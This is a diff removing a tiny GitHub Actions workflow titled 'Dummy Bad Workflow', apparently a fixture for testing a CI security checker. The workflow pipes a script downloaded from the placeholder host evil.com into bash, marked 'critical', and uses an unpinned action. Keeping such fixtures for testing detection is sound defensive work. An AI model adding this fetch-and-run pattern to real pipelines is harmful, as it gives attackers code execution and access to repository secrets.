@@ -1,9 +1,0 @@
-name: Dummy Bad Workflow
-on: push
-
-jobs:
-  insecure:
-    runs-on: ubuntu-latest
-    steps:
-      - run: curl https://evil.com/install.sh | bash   # critical
-      - uses: actions/upload-artifact@v3               # unpinned
